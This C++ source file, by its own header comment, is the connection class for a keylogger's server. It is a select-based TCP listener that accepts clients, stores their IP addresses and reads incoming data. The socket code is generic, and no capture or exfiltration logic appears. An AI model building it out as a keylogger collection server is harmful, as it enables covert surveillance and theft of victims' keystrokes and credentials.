/*Connexion class for server keylogger*/

#include "Connexion.hh"

Connexion::Connexion(const int _port)
{
  this->port = _port;
  this->client_len = sizeof(sin_client);
  this->pe = getprotobyname("TCP");
  if ((this->socket_fd = socket(AF_INET, SOCK_STREAM, pe->p_proto)) == -1)
    {
      std::cerr << "Socket failed" << std::endl;
      exit(-1);
    }
  this->sin.sin_family = AF_INET;
  this->sin.sin_port = htons(this->port);
  this->sin.sin_addr.s_addr = INADDR_ANY;
  if (bind(this->socket_fd, (const struct sockaddr*)&(this->sin), sizeof(this->sin)) == -1)
    {
      std::cerr << "Bind failed" << std::endl;
      exit(-1);
    }
  if (listen(this->socket_fd, 2) == -1)
    {
      std::cerr << "Listen failed" << std::endl;
      exit(-1);
    }
  this->waitConnexion();
}

Connexion::~Connexion()
{}

bool		Connexion::newConnexion()
{
  int		fd;
  char		*ip;
  
  if ((fd = accept(this->socket_fd, (struct sockaddr*)&this->sin_client, (socklen_t*)&this->client_len)) == -1)
    {
      std::cerr << "Accept failed" << std::endl;
      return (false);
    }
  ip = inet_ntoa(this->sin_client.sin_addr);
  this->listClient.push_back(new Client(fd, ip));
  return (true);
}

void		Connexion::waitConnexion()
{
  fd_set		readfds;
  int			fd_max;
  std::list<Client*>::iterator	it;
  
  while (true)
    {
      fd_max = checkMaxFd(&readfds);
      if (select(fd_max + 1, &readfds, NULL, NULL, NULL) == -1)
	  printf("ERROR: Select failed !\n");
      else
	{
	  //(FD_ISSET(0, &readfds)) ? end = serverCommand(bag) : end;
	  if (FD_ISSET(this->socket_fd, &readfds))
	    this->newConnexion();
	  for (it = this->listClient.begin(); it != this->listClient.end(); ++it)
	    {
	      if (FD_ISSET((*it)->getFD(), &readfds))
		  (*it)->readFrom();
	    }
	}
    }
}

int             Connexion::checkMaxFd(fd_set *readfds)
{
  int           fd_max;
  std::list<Client*>::iterator	it;
  
  fd_max = this->socket_fd;
  FD_ZERO(readfds);
  FD_SET(this->socket_fd, readfds);
  //FD_SET(0, readfds);
  for (it = this->listClient.begin(); it != this->listClient.end(); ++it)
    {
      FD_SET((*it)->getFD(), readfds);
      if ((*it)->getFD() > fd_max)
	fd_max = (*it)->getFD();
    }
  return (fd_max);
}
